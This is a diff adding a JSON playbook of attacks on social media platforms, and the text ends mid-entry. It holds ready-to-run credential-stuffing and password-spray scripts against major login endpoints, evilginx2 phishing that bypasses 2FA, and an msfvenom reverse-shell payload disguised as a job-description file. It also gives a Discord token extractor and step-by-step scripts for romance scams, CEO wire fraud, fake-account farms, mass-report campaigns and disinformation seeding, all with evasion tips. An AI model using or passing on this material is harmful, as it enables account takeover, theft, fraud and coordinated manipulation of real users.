@@ -1,0 +1,873 @@
+{
+  "osint_account_recon": {
+    "description": "Open-source intelligence gathering on social media targets \u2014 identity mapping, account enumeration, cross-platform correlation, and profile harvesting.",
+    "mitre": "T1591",
+    "commands": [
+      {
+        "description": "Run Sherlock to find username across 400+ platforms simultaneously.",
+        "method": "Sherlock",
+        "command": "python3 sherlock.py {username} --output {username}_results.txt --csv"
+      },
+      {
+        "description": "WhatsMyName \u2014 multi-platform username enumeration with API response codes.",
+        "method": "WhatsMyName",
+        "command": "python3 whatsmyname.py -u {username} -o {username}_wmn.csv"
+      },
+      {
+        "description": "Maigret \u2014 deep account recon with site-specific parsing and relationship mapping.",
+        "method": "Maigret",
+        "command": "python3 -m maigret {username} --html --pdf -o report_{username}"
+      },
+      {
+        "description": "Enumerate all public posts, likes, and friends of a Facebook profile.",
+        "method": "socialscan",
+        "command": "socialscan {username} --platforms facebook twitter instagram linkedin github reddit"
+      },
+      {
+        "description": "Extract email, phone, and linked accounts from LinkedIn public profile.",
+        "method": "LinkedInt",
+        "command": "python3 LinkedInt.py -u {company_or_person} --full --email"
+      },
+      {
+        "description": "Harvest Twitter/X followers, following, and tweet metadata with timestamps.",
+        "method": "Twint",
+        "command": "twint -u {username} --followers --following --tweets -o {username}_twitter.csv --csv"
+      },
+      {
+        "description": "Extract Instagram profile metadata, followers, and stories without login.",
+        "method": "Osintgram",
+        "command": "python3 main.py {target_username}\n# Commands: info, followers, followings, addrs, photos, stories"
+      },
+      {
+        "description": "Cross-correlate handles across platforms to build full identity profile.",
+        "method": "SpiderFoot",
+        "command": "python3 sf.py -m sfp_accounts,sfp_social -s {username_or_email} -F EMAIL,USERNAME,SOCIAL_MEDIA,PHONE -o TDF -f results.csv"
+      },
+      {
+        "description": "Enumerate Reddit user history \u2014 post activity, subs, timing patterns.",
+        "method": "PRAW",
+        "command": "import praw\nreddit = praw.Reddit(client_id='{id}',client_secret='{secret}',user_agent='ua')\nfor post in reddit.redditor('{username}').submissions.new(limit=1000):\n    print(post.created_utc, post.subreddit, post.title)"
+      },
+      {
+        "description": "Extract geolocation from geotagged Instagram and Twitter posts.",
+        "method": "Instaloader",
+        "command": "# Twitter: twint -u {username} --geo --output geo.csv\n# Instagram: instaloader --geotags {username}"
+      }
+    ],
+    "prerequisites": "Target identity information; access to social media platforms or OSINT tools",
+    "opsec": "Don't view target profiles from personal accounts. Use throwaway accounts or guest browsing. Wayback Machine and cached searches are passive.",
+    "detection_ref": "Profile view notifications; rate limiting on scraping; account authenticity verification; employee social media policies"
+  },
+  "account_takeover_credential_attacks": {
+    "description": "Account takeover via credential stuffing, password spraying, and password reset abuse on social media platforms.",
+    "mitre": "T1586",
+    "commands": [
+      {
+        "description": "Credential stuffing against Instagram login endpoint with combo list and proxy rotation.",
+        "method": "Python",
+        "command": "import requests, time, random\nproxies = open('proxies.txt').readlines()\nfor line in open('combo.txt'):\n    user, pwd = line.strip().split(':')\n    proxy = {'https': random.choice(proxies).strip()}\n    r = requests.post('https://www.instagram.com/accounts/login/ajax/',\n        data={'username': user, 'enc_password': pwd},\n        headers={'X-CSRFToken': '{csrf}', 'User-Agent': 'Instagram 245.0.0.16'},\n        proxies=proxy, timeout=10)\n    if '\"authenticated\":true' in r.text:\n        print('HIT:', user, pwd)\n    time.sleep(random.uniform(5, 15))"
+      },
+      {
+        "description": "Low-and-slow Twitter/X password spray to avoid lockout \u2014 one attempt per account per 15min.",
+        "method": "Python",
+        "command": "import requests, time, random\nfor password in open('top100.txt'):\n    for user in open('targets.txt'):\n        r = requests.post('https://api.twitter.com/auth/1/xauth_access_token.json',\n            data={'x_auth_username': user.strip(), 'x_auth_password': password.strip(), 'x_auth_mode': 'client_auth'})\n        if 'oauth_token' in r.text: print('VALID:', user.strip(), password.strip())\n        time.sleep(random.uniform(60, 300))"
+      },
+      {
+        "description": "Facebook password reset via phone number enumeration.",
+        "method": "curl",
+        "command": "curl -X POST 'https://www.facebook.com/login/identify/' -d 'email={phone_or_email}&did_submit=1' | grep -i 'sent|found|not found'"
+      },
+      {
+        "description": "LinkedIn credential spray via login API.",
+        "method": "Python",
+        "command": "import requests\nfor pwd in open('passwords.txt'):\n    r = requests.post('https://www.linkedin.com/checkpoint/lg/login-submit',\n        data={'session_key':'{email}','session_password':pwd.strip(),'isJsEnabled':'false'})\n    if 'feed' in r.url: print('Valid:', pwd)"
+      },
+      {
+        "description": "TikTok account brute force via mobile API \u2014 rotate device_id per attempt.",
+        "method": "Python",
+        "command": "import requests, random\nfor pwd in open('passwords.txt'):\n    r = requests.post('https://api16-normal-v6.tiktokv.com/passport/user/login/',\n        headers={'User-Agent':'com.zhiliaoapp.musically/2022600030','X-Tt-Device-Id':str(random.randint(10**18,10**19))},\n        json={'username':'{user}','password':pwd.strip(),'mix_mode':1})\n    if r.json().get('data',{}).get('session_key'): print('HIT:',pwd)"
+      },
+      {
+        "description": "Session cookie hijack and replay for instant account access post-MiTM.",
+        "method": "mitmproxy",
+        "command": "mitmdump -s cookie_extractor.py --ssl-insecure\n# Then replay:\ncurl -b 'sessionid={stolen_cookie}' https://www.instagram.com/accounts/edit/"
+      },
+      {
+        "description": "Abuse platform 'find friends by phone' to enumerate registered accounts at scale.",
+        "method": "Python",
+        "command": "import requests\nphones = ['+1'+str(n) for n in range(2000000000, 2000001000)]\nfor phone in phones:\n    r = requests.post('https://api.instagram.com/v1/accounts/contact_point_signup_challenge/',\n        json={'phone_number': phone},\n        headers={'Authorization':'Bearer {token}'})\n    if 'taken' in r.text.lower(): print('REGISTERED:', phone)"
+      }
+    ],
+    "prerequisites": "Leaked credential database or phishing infrastructure; target social media accounts identified",
+    "opsec": "Credential stuffing via residential proxies to avoid IP blocking. Use low-and-slow approach \u2014 avoid bulk attempts. Account takeover leaves login location anomaly.",
+    "detection_ref": "Anomalous login location/device alerts; credential stuffing detection (rate limiting, CAPTCHA); HIBP breach monitoring; MFA enforcement"
+  },
+  "platform_api_exploitation": {
+    "description": "Exploiting official and undocumented social media APIs for unauthorized data access, mass scraping, and automation beyond allowed limits.",
+    "mitre": "T1119",
+    "commands": [
+      {
+        "description": "Access Instagram private API with mobile session token to retrieve hidden data.",
+        "method": "Python",
+        "command": "import requests\nheaders = {'User-Agent':'Instagram 245.0.0.16.106 Android','Authorization':'Bearer {ig_token}'}\nr = requests.get('https://i.instagram.com/api/v1/accounts/{user_id}/info/', headers=headers)\nprint(r.json())"
+      },
+      {
+        "description": "Extract Facebook friends list via Graph API with stolen access token.",
+        "method": "curl",
+        "command": "curl 'https://graph.facebook.com/me/friends?fields=id,name,email,picture&limit=5000&access_token={stolen_token}'"
+      },
+      {
+        "description": "Enumerate LinkedIn connections via undocumented Voyager API.",
+        "method": "curl",
+        "command": "curl 'https://www.linkedin.com/voyager/api/relationships/dash/connections?decorationId=com.linkedin.voyager.dash.deco.web.mynetwork.ConnectionListWithProfile&count=100&start=0' -H 'Csrf-Token: {csrf}' -H 'Cookie: {li_at_cookie}'"
+      },
+      {
+        "description": "Bypass Twitter/X API rate limits by rotating multiple app tokens.",
+        "method": "Python",
+        "command": "import tweepy, itertools\ntokens = [('key1','secret1','token1','tsecret1'),('key2','secret2','token2','tsecret2')]\nkey_pool = itertools.cycle(tokens)\ndef get_api():\n    k = next(key_pool)\n    auth = tweepy.OAuth1UserHandler(*k)\n    return tweepy.API(auth, wait_on_rate_limit=True)"
+      },
+      {
+        "description": "Scrape TikTok private API for user data without auth using device emulation.",
+        "method": "Python",
+        "command": "from TikTokApi import TikTokApi\napi = TikTokApi()\nuser = api.user('{username}')\nfor video in user.videos(count=100):\n    print(video.id, video.stats)"
+      },
+      {
+        "description": "Extract Discord server members, roles, and messages via user token (not bot).",
+        "method": "Python",
+        "command": "import requests\nheaders = {'Authorization': '{user_token}'}\nmembers = requests.get('https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000', headers=headers)\nfor m in members.json(): print(m['user']['username'], m['roles'])"
+      },
+      {
+        "description": "Telegram mass member extraction from public groups via Pyrogram.",
+        "method": "Python",
+        "command": "from pyrogram import Client\napp = Client('extractor', api_id={api_id}, api_hash='{api_hash}')\nwith app:\n    for member in app.get_chat_members('{group_username}'):\n        print(member.user.id, member.user.first_name, member.user.username)"
+      },
+      {
+        "description": "Reddit API mass harvest \u2014 posts and comments from subreddit.",
+        "method": "PRAW",
+        "command": "import praw\nreddit = praw.Reddit(client_id='{id}', client_secret='{secret}', user_agent='ua')\nfor post in reddit.subreddit('{subreddit}').top(limit=1000, time_filter='all'):\n    print(post.author, post.title)"
+      }
+    ],
+    "prerequisites": "Platform API access (OAuth token or public API); target data accessible via API",
+    "opsec": "API scraping can hit rate limits and trigger account suspension. Use token rotation and request spacing. Twitter API v2 requires developer account.",
+    "detection_ref": "API rate limiting; OAuth token monitoring; anomalous API usage patterns; developer account abuse detection"
+  },
+  "account_evasion_and_bypass": {
+    "description": "Bypassing platform security controls \u2014 bot detection, rate limiting, account bans, 2FA, CAPTCHA, and device fingerprinting.",
+    "mitre": "T1564",
+    "commands": [
+      {
+        "description": "Rotate residential proxies per request to bypass IP-based rate limits and bans.",
+        "method": "Python",
+        "command": "import requests, itertools\nproxies = [{'https':'socks5://{proxy1}'},{'https':'socks5://{proxy2}'}]\npool = itertools.cycle(proxies)\ndef req(url, **kwargs):\n    return requests.get(url, proxies=next(pool), **kwargs)"
+      },
+      {
+        "description": "Human behavior emulation via Playwright to bypass Instagram bot detection.",
+        "method": "Playwright",
+        "command": "from playwright.async_api import async_playwright\nimport asyncio, random\nasync def go():\n    async with async_playwright() as p:\n        browser = await p.chromium.launch(headless=False)\n        page = await browser.new_page()\n        await page.goto('https://www.instagram.com/')\n        await page.mouse.move(random.randint(100,500), random.randint(100,500))\n        await asyncio.sleep(random.uniform(1.5, 4.0))\nasyncio.run(go())"
+      },
+      {
+        "description": "Spoof browser fingerprint using puppeteer-extra stealth plugin.",
+        "method": "Node.js",
+        "command": "const puppeteer = require('puppeteer-extra')\nconst StealthPlugin = require('puppeteer-extra-plugin-stealth')\npuppeteer.use(StealthPlugin())\nconst browser = await puppeteer.launch({headless:true})\n// Spoofs: webGL, canvas, audio, navigator.plugins, webdriver flag"
+      },
+      {
+        "description": "Solve CAPTCHA automatically via 2captcha API to bypass account checkpoints.",
+        "method": "Python",
+        "command": "import requests, time\nr = requests.post('https://2captcha.com/in.php',\n    data={'key':'{api_key}','method':'base64','body':'{base64_captcha}','json':1})\ncid = r.json()['request']\ntime.sleep(20)\nsolution = requests.get(f'https://2captcha.com/res.php?key={api_key}&action=get&id={cid}&json=1').json()['request']"
+      },
+      {
+        "description": "Use virtual phone number via SMS-Activate API for account verification bypass.",
+        "method": "curl",
+        "command": "curl 'https://api.sms-activate.org/stubs/handler_api.php?api_key={key}&action=getNumber&service=ig&country=0'\n# Returns: ACCESS_NUMBER:{id}:{phone_number}\n# Wait for OTP: ?action=getStatus&id={id}"
+      },
+      {
+        "description": "Bypass Instagram 2FA via evilginx2 reverse proxy that captures post-2FA session token.",
+        "method": "evilginx2",
+        "command": "evilginx2 -developer\nphishlets enable instagram\nlures create instagram\nlures get-url 0\n# Victim authenticates (including TOTP 2FA), evilginx captures full session cookie"
+      },
+      {
+        "description": "Randomize User-Agent and Accept headers per request to evade bot signatures.",
+        "method": "Python",
+        "command": "from fake_useragent import UserAgent\nimport requests\nua = UserAgent()\nheaders = {'User-Agent':ua.random,'Accept-Language':'en-US,en;q=0.9','Accept-Encoding':'gzip, deflate, br'}\nrequests.get('{url}', headers=headers)"
+      },
+      {
+        "description": "Route traffic through TOR with circuit rotation between platform sessions.",
+        "method": "torsocks",
+        "command": "torsocks python3 login_script.py\n# Force new circuit:\necho 'AUTHENTICATE; SIGNAL NEWNYM' | nc 127.0.0.1 9051"
+      },
+      {
+        "description": "Bypass Twitter rate limit using X-Forwarded-For header spoofing on legacy endpoints.",
+        "method": "Python",
+        "command": "import requests, random\nheaders = {'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}'}\nrequests.post('https://api.twitter.com/1.1/statuses/update.json', headers=headers, data={'status':'test'})"
+      }
+    ],
+    "prerequisites": "Suspended/banned accounts; new account infrastructure; IP rotation",
+    "opsec": "Use residential proxies and VPNs for new accounts after suspension. Clear browser fingerprints. Gradual activity ramp-up avoids rapid detection.",
+    "detection_ref": "Platform behavioral analysis; device fingerprinting; ban evasion detection; IP reputation scoring"
+  },
+  "fake_account_sockpuppet_creation": {
+    "description": "Creating convincing fake and sockpuppet accounts at scale for influence operations, phishing, and social engineering.",
+    "mitre": "T1585",
+    "commands": [
+      {
+        "description": "Generate realistic AI persona photos using ThisPersonDoesNotExist.",
+        "method": "Python",
+        "command": "import requests, uuid\nfor i in range(10):\n    img = requests.get('https://thispersondoesnotexist.com/', headers={'Cache-Control':'no-cache'})\n    with open(f'persona_{i}.jpg','wb') as f: f.write(img.content)"
+      },
+      {
+        "description": "Generate complete fake identity (name, email, address, phone) for persona.",
+        "method": "curl",
+        "command": "curl 'https://randomuser.me/api/?results=10&nat=us,gb,ca&format=json' | jq '.results[] | {name:.name.first+\" \"+.name.last, email:.email, phone:.phone, city:.location.city}'"
+      },
+      {
+        "description": "Automate Twitter/X account registration with undetected-chromedriver.",
+        "method": "Python",
+        "command": "import undetected_chromedriver as uc\nfrom selenium.webdriver.common.by import By\ndriver = uc.Chrome()\ndriver.get('https://twitter.com/i/flow/signup')\n# Fill form with generated identity, solve CAPTCHA via 2captcha, verify via virtual number"
+      },
+      {
+        "description": "Account aging automation \u2014 simulate organic activity to build account trust score.",
+        "method": "Python",
+        "command": "# Aging strategy:\n# Week 1: Follow 50-100 accounts in target niche\n# Week 2-4: Like 10-20 posts/day, occasional repost\n# Week 5+: Start original posting\n# Maintain follow:follower ratio > 0.3\n# Automate with Instagrapi (Instagram) or Tweepy (Twitter)"
+      },
+      {
+        "description": "Create LinkedIn sockpuppet with fabricated career at real companies.",
+        "method": "Manual",
+        "command": "# Setup checklist:\n# 1. AI-generated professional photo\n# 2. Fake work history at recognizable mid-size companies (no employment verification)\n# 3. Plausible university (match company industry)\n# 4. Connect with 50+ real people from target industry\n# 5. LinkedIn Premium free trial to appear as serious professional\n# 6. Populate skills, endorsements from other sock accounts"
+      },
+      {
+        "description": "Buy aged social media accounts from underground markets for immediate credibility.",
+        "method": "OSINT",
+        "command": "# Account markets: accs-market.com, sellix.io, ogflip.com, playerup.com\n# Look for: 2015+ Facebook, PVA Instagram, Twitter 5k+ followers\n# Verify: account age, engagement rate, no prior bans\n# Pricing: Facebook $2-10, Instagram 2k followers $20, Twitter aged $15"
+      },
+      {
+        "description": "Mass Telegram account creation via virtual numbers for spam campaigns.",
+        "method": "Python",
+        "command": "from telethon import TelegramClient\nimport asyncio\nasync def register(phone):\n    client = TelegramClient(f'session_{phone}', {api_id}, '{api_hash}')\n    await client.start(phone=phone)\n    await client.update_profile(first_name='{name}', about='{bio}')\nasyncio.run(register('{phone_number}'))"
+      }
+    ],
+    "prerequisites": "Email addresses for registration; phone numbers for SMS verification (VoIP acceptable); plausible identity",
+    "opsec": "Age accounts before use (2+ weeks). Use organic-looking content history. Link accounts to consistent backstory across platforms.",
+    "detection_ref": "Platform AI detection for inauthentic behavior; coordinated inauthentic behavior (CIB) detection; phone number verification requirements"
+  },
+  "social_engineering_attacks": {
+    "description": "Direct social engineering via social media \u2014 pretexting, catfishing, romance scams, and trust manipulation for access or fraud.",
+    "mitre": "T1566",
+    "commands": [
+      {
+        "description": "LinkedIn recruiter impersonation \u2014 steal credentials via fake job portal with SSO clone.",
+        "method": "GoPhish + evilginx2",
+        "command": "# 1. Create recruiter persona at target's competitor on LinkedIn\n# 2. Connect with target, reference real job opening\n# 3. Send: 'Application portal uses LinkedIn SSO \u2014 log in to apply: {phish_link}'\n# 4. evilginx2 captures credentials AND session token (bypasses MFA)"
+      },
+      {
+        "description": "Twitter/X support impersonation DM for urgent account verification phishing.",
+        "method": "Manual",
+        "command": "# Template:\n# 'Hi {name}, this is @TwitterSafety. We detected suspicious login attempts.\n# Verify your identity at [phish_link] to avoid suspension. 24 hours to respond.'\n# Use handle: @Twitter_Helpdesk @X-Support-Team @TwitterHelp_Official"
+      },
+      {
+        "description": "Instagram romance scam pipeline \u2014 build rapport then harvest credentials or funds.",
+        "method": "Manual",
+        "command": "# Phase 1 (Week 1-2): Build rapport via DMs, genuine interest in victim\n# Phase 2 (Week 3-4): 'Relationship', share AI-generated personal photos\n# Phase 3 (Week 5+):\n#   Option A: 'My private photos are at this link, log in to see' -> phishing\n#   Option B: Emergency (medical/travel) -> request wire transfer\n#   Option C: 'Invest in my crypto platform' -> fake exchange"
+      },
+      {
+        "description": "Discord admin impersonation DM \u2014 wallet drainer or token stealer via fake verification.",
+        "method": "Manual",
+        "command": "# 1. Join target NFT/crypto Discord\n# 2. Create account with same avatar as admin, similar name (Admin vs Adm1n)\n# 3. DM members: 'You have been whitelisted! Verify wallet at: {drainer_site}'\n# OR: 'Server is being attacked \u2014 verify you're not a bot: {link}'\n# Payload: MetaMask signature that drains wallet or Discord token stealer"
+      },
+      {
+        "description": "WhatsApp CEO fraud \u2014 impersonate executive to CFO for BEC wire transfer.",
+        "method": "Manual",
+        "command": "# 1. OSINT: find exec's WhatsApp display name and photo from LinkedIn\n# 2. Set up matching WhatsApp profile (same photo, name)\n# 3. Message CFO: 'I am in a confidential meeting, cannot call.\n#    Process urgent vendor payment: $X to {account}. Confirm receipt.'\n# Effectiveness: WhatsApp seen as personal/trusted, less scrutinized than email"
+      },
+      {
+        "description": "Facebook Marketplace fraud \u2014 phishing page during payment flow.",
+        "method": "Manual",
+        "command": "# 1. Post fake high-value listing (iPhone, PS5, concert tickets)\n# 2. When buyer contacts: 'Use our secure payment portal to hold item'\n# 3. Phishing page: cloned Venmo/PayPal/Zelle capturing card + login\n# OR: Request buyer sends ID for 'age verification' -> identity theft"
+      },
+      {
+        "description": "LinkedIn spear phish using company OSINT for credential harvest via IT pretext.",
+        "method": "Manual",
+        "command": "# 1. OSINT target company: tech stack, VPN vendor, email platform from LinkedIn/Glassdoor\n# 2. Build IT impersonation email matching internal IT helpdesk format\n# 3. LinkedIn message: 'Hi {name}, IT team here re: your VPN access expiring.\n#    Update credentials by EOD: {phish_link}'\n# Key: reference actual tools/systems they use for credibility"
+      }
+    ],
+    "prerequisites": "Target social media profiles; compelling pretext; fake or cloned profile",
+    "opsec": "Build rapport over multiple interactions before requesting sensitive information. Clone profile photos and biographical details from real users.",
+    "detection_ref": "Profile verification badges; reverse image search; employee awareness training; two-step verification for sensitive requests"
+  },
+  "influence_operations": {
+    "description": "Coordinated inauthentic behavior \u2014 amplification, hashtag manipulation, astroturfing, mass reporting, and narrative seeding.",
+    "mitre": "T1585.001",
+    "commands": [
+      {
+        "description": "Coordinate fake engagement from sockpuppet network to boost post into trending.",
+        "method": "Python",
+        "command": "import tweepy, time, random\naccs = [tweepy.API(tweepy.OAuth1UserHandler(*c)) for c in creds_list]\nfor api in accs:\n    api.retweet('{tweet_id}')\n    api.create_favorite('{tweet_id}')\n    time.sleep(random.uniform(10, 60))  # stagger to appear organic"
+      },
+      {
+        "description": "Hashtag hijacking \u2014 flood target hashtag with off-topic content to disrupt movement.",
+        "method": "Python",
+        "command": "import tweepy, time, itertools, random\nmessages = ['Message 1 #{hashtag}', 'Message 2 #{hashtag}', 'Message 3 #{hashtag}']\nmsg_pool = itertools.cycle(messages)\nfor api in account_pool:\n    api.update_status(next(msg_pool))\n    time.sleep(random.uniform(30, 120))"
+      },
+      {
+        "description": "Botometer-evading bot behavior \u2014 human posting patterns and variance.",
+        "method": "Python",
+        "command": "import time, random\ndef post_humanized(api, text):\n    hour = time.gmtime().tm_hour\n    if not (8 <= hour <= 22): return  # human hours only\n    time.sleep(random.uniform(300, 7200))  # 5min-2hr between posts\n    if random.random() < 0.1:  # 10% chance of deliberate typo\n        pos = random.randint(0, len(text)//2)\n        text = text[:pos] + text[pos+1:]\n    api.update_status(text)"
+      },
+      {
+        "description": "Mass coordinated account report campaign to suspend target account.",
+        "method": "Manual",
+        "command": "# Coordinated reporting playbook:\n# 1. Identify target account for suspension\n# 2. Screenshot reportable content (harassment/hate/spam)\n# 3. Coordinate 100+ accounts to simultaneously report target\n# 4. Report via mobile app (higher weighted than web)\n# 5. Submit abuse@ email complaint for additional pressure\n# 6. Use fresh accounts to avoid counter-report detection"
+      },
+      {
+        "description": "Reddit brigade \u2014 coordinated upvote/downvote and comment flooding.",
+        "method": "PRAW",
+        "command": "import praw, time, random\naccounts = [praw.Reddit(username=u, password=p, client_id=c, client_secret=s, user_agent='ua') for u,p,c,s in creds]\nfor api in accounts:\n    sub = api.submission(id='{post_id}')\n    sub.upvote()\n    time.sleep(random.uniform(10, 60))"
+      },
+      {
+        "description": "YouTube engagement manipulation to push content in recommendation algorithm.",
+        "method": "Python",
+        "command": "from googleapiclient.discovery import build\nyoutube = build('youtube', 'v3', developerKey='{api_key}')\nyoutube.commentThreads().insert(\n    part='snippet',\n    body={'snippet':{'videoId':'{video_id}','topLevelComment':{'snippet':{'textOriginal':'{comment}'}}}}\n).execute()"
+      },
+      {
+        "description": "Viral disinfo seeding \u2014 craft and distribute misleading post with credibility artifacts.",
+        "method": "Manual",
+        "command": "# Seeding methodology:\n# 1. Create misleading post with authentic-looking screenshot (Inspect Element or screenshot editor)\n# 2. Post from aged, credible-looking account\n# 3. Have 5-10 sockpuppets immediately share before fact-checkers react\n# 4. Cross-post: Reddit, Facebook groups, WhatsApp channels, Telegram\n# 5. Optimal timing: peak engagement hours (7-9am, 12pm, 5-7pm local)\n# 6. Emotional framing: outrage, fear, tribalism for maximum organic spread"
+      }
+    ],
+    "prerequisites": "Network of controlled accounts; content amplification capabilities; target messaging identified",
+    "opsec": "Coordinate amplification in non-public channels (Signal, Telegram). Use timing delays between account actions. Blend organic and coordinated content.",
+    "detection_ref": "Platform CIB detection; network analysis for coordinated behavior; content authenticity initiatives (CAI); media literacy programs"
+  },
+  "phishing_via_social_platforms": {
+    "description": "Phishing and malware delivery using social media platforms as the attack vector \u2014 DMs, posts, stories, and bot messages.",
+    "mitre": "T1566.003",
+    "commands": [
+      {
+        "description": "Deploy evilginx2 Instagram phishlet to capture credentials AND bypass 2FA.",
+        "method": "evilginx2",
+        "command": "evilginx2 -developer -p ./phishlets\nphishlets enable instagram\nconfig domain {phish_domain}\nconfig ip {vps_ip}\nlures create instagram\nlures get-url 0\n# Captures: username, password, session token \u2014 bypasses TOTP 2FA"
+      },
+      {
+        "description": "Facebook Messenger malware delivery via compromised friend account.",
+        "method": "Manual",
+        "command": "# High-conversion templates:\n# 'omg is this you in this video?? [bitly_payload]'\n# 'someone is saying bad things about you: [link]'\n# 'FREE {Brand} giftcard limited time: [link]'\n# Payload: fake browser update page, drive-by download, malicious extension install"
+      },
+      {
+        "description": "Twitter/X DM phishing with trusted-domain URL redirect to bypass link scanner.",
+        "method": "Manual",
+        "command": "# URL obfuscation chain:\n# 1. Google AMP: https://www.google.com/amp/s/{phish_domain}\n# 2. Google Translate: https://translate.google.com/translate?u={phish_url}\n# 3. YouTube redirect: https://www.youtube.com/redirect?q={phish_url}\n# 4. Open redirect: {trusted_site}/redirect?url={phish_url}\n# 5. Time-delay: serve benign for 48hr, swap to malicious post-scan"
+      },
+      {
+        "description": "WhatsApp group malware distribution via urgency-themed broadcast.",
+        "method": "Manual",
+        "command": "# High-engagement templates by region:\n# 'Government announces free relief funds! Claim: {link}'\n# 'Your WhatsApp account will be suspended \u2014 verify: {link}'\n# 'Someone shared your private photo by mistake: {link}'\n# Key: WhatsApp links bypass most corporate email security scanners"
+      },
+      {
+        "description": "Discord welcome bot malware delivery on member join.",
+        "method": "Python",
+        "command": "import discord\nfrom discord.ext import commands\nbot = commands.Bot(command_prefix='!')\n@bot.event\nasync def on_member_join(member):\n    await member.send(f'Welcome {member.name}! Get exclusive roles: {phishing_link}')\nbot.run('{bot_token}')"
+      },
+      {
+        "description": "QR code phishing distributed via Instagram stories and Twitter posts.",
+        "method": "Python",
+        "command": "import qrcode\nqr = qrcode.QRCode(version=1, box_size=10, border=4)\nqr.add_data('https://{phishing_domain}/login')\nqr.make(fit=True)\nqr.make_image(fill='black',back_color='white').save('offer_qr.png')\n# Distribute via: Instagram story, Twitter post, Facebook ad, Telegram status"
+      },
+      {
+        "description": "LinkedIn malicious attachment delivery via InMail with fake job description.",
+        "method": "msfvenom + GoPhish",
+        "command": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT=443 -f docx > job_description.docx\n# Send via LinkedIn InMail:\n# 'Thanks for your interest! Review full JD before our call tomorrow [attachment]'"
+      },
+      {
+        "description": "TikTok creator impersonation \u2014 clone channel to distribute malware to fans.",
+        "method": "Manual",
+        "command": "# 1. Create account with creator's username variant (underscore, dot)\n# 2. Copy avatar and bio exactly\n# 3. Comment on real creator's posts: 'Follow my backup!'\n# 4. DM followers: 'Download my exclusive app for fan content: {link}'\n# 5. Payload: malicious APK (Android) or fake MacOS .dmg"
+      }
+    ],
+    "prerequisites": "Social platform messaging capability; target identified; phishing infrastructure",
+    "opsec": "Social platform DMs bypass email filters entirely. Shortened URLs and platform-native links blend with legitimate traffic. Clone legitimate brand profiles.",
+    "detection_ref": "Platform link scanning; user-reported phishing; suspicious DM detection; link preview warnings"
+  },
+  "data_harvesting_and_scraping": {
+    "description": "Mass data extraction from social media profiles, posts, connections, and metadata for targeting, intelligence, and dossier building.",
+    "mitre": "T1119",
+    "commands": [
+      {
+        "description": "Scrape full LinkedIn company employee list for spear-phishing target generation.",
+        "method": "linkedin2username",
+        "command": "python3 linkedin2username.py -u {your_linkedin_user} -p {password} -c {company_name}\n# Generates: first.last, flast, firstl formats for password spray"
+      },
+      {
+        "description": "Instaloader \u2014 bulk Instagram harvest (posts, stories, followers, tagged, highlights).",
+        "method": "Instaloader",
+        "command": "instaloader --login={your_ig_user} --count=1000 --highlights --stories --tagged --comments --followees-of={target_username}\n# Public profile:\ninstaloader --count=200 --no-video-thumbnails {target_username}"
+      },
+      {
+        "description": "Twitter/X full archive dump via API v2 with all metadata fields.",
+        "method": "Tweepy",
+        "command": "import tweepy\nclient = tweepy.Client(bearer_token='{bearer_token}')\nfor tweet in tweepy.Paginator(client.get_users_tweets, id='{user_id}',\n    tweet_fields=['created_at','geo','entities'], max_results=100).flatten(limit=3200):\n    print(tweet.created_at, tweet.text)"
+      },
+      {
+        "description": "Telegram channel full message archive extraction.",
+        "method": "Pyrogram",
+        "command": "from pyrogram import Client\nimport csv\napp = Client('harvester', api_id={api_id}, api_hash='{api_hash}')\nwith app, open('messages.csv','w') as f:\n    writer = csv.writer(f)\n    for msg in app.get_chat_history('{channel}', limit=10000):\n        writer.writerow([msg.id, msg.date, msg.from_user.username if msg.from_user else '', msg.text])"
+      },
+      {
+        "description": "Discord server scrape \u2014 all messages, members, roles via user token.",
+        "method": "Python",
+        "command": "import requests\nheaders = {'Authorization': '{user_token}'}\nchannels = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers).json()\nfor ch in channels:\n    if ch['type'] == 0:\n        msgs = requests.get(f'https://discord.com/api/v9/channels/{ch[\"id\"]}/messages?limit=100', headers=headers).json()\n        for m in msgs: print(ch['name'], m['author']['username'], m['content'])"
+      },
+      {
+        "description": "Facebook group member and post harvest via Graph API with user token.",
+        "method": "Python",
+        "command": "import requests\nr = requests.get(f'https://graph.facebook.com/{group_id}/feed',\n    params={'fields':'id,message,from,created_time','limit':100,'access_token':'{user_token}'})\nfor post in r.json()['data']:\n    print(post['from']['name'], post.get('message','')[:100])"
+      },
+      {
+        "description": "Pinterest board and pin extraction for OSINT and interest profiling.",
+        "method": "Python",
+        "command": "import requests\nheaders = {'Authorization': 'Bearer {pinterest_token}'}\nboards = requests.get('https://api.pinterest.com/v5/boards/', headers=headers, params={'page_size':100}).json()\nfor board in boards['items']:\n    pins = requests.get(f'https://api.pinterest.com/v5/boards/{board[\"id\"]}/pins', headers=headers, params={'page_size':250}).json()\n    for pin in pins['items']: print(pin.get('title'), pin.get('link'))"
+      },
+      {
+        "description": "Apollo.io API \u2014 extract employee emails by company domain for spear phishing.",
+        "method": "curl",
+        "command": "curl 'https://api.apollo.io/v1/people/search' -H 'X-Api-Key: {apollo_key}' -d '{\"organization_domains\":[\"{target_domain}\"],\"page\":1,\"per_page\":100,\"person_titles\":[\"engineer\",\"admin\",\"developer\"]}'\n# Returns: name, email, LinkedIn URL, title, phone"
+      }
+    ],
+    "prerequisites": "Scraping tool (Scrapy, Selenium); platform API access or public profile access",
+    "opsec": "Respect robots.txt to avoid legal exposure (though not security-relevant). Use API where available. Residential proxy rotation prevents IP bans.",
+    "detection_ref": "Rate limiting and CAPTCHA challenges; browser fingerprinting; API terms of service enforcement; scraping pattern detection"
+  },
+  "account_hijacking_token_theft": {
+    "description": "Stealing social media session tokens, OAuth tokens, and platform API keys for persistent unauthorized account access.",
+    "mitre": "T1539",
+    "commands": [
+      {
+        "description": "Extract Discord token from victim's desktop app LevelDB storage.",
+        "method": "PowerShell",
+        "command": "$path = \"$env:APPDATA\\discord\\Local Storage\\leveldb\"\nGet-ChildItem $path -Filter '*.ldb' | ForEach-Object {\n    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue\n    if ($content -match '([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27})')\n    {Write-Host \"Token: $($Matches[0])\"}}\n# Or for all Chromium-based apps:\n# Check: AppData\\Roaming\\{app}\\Local Storage\\leveldb"
+      },
+      {
+        "description": "Extract Telegram desktop session (tdata folder) for session portability.",
+        "method": "Shell",
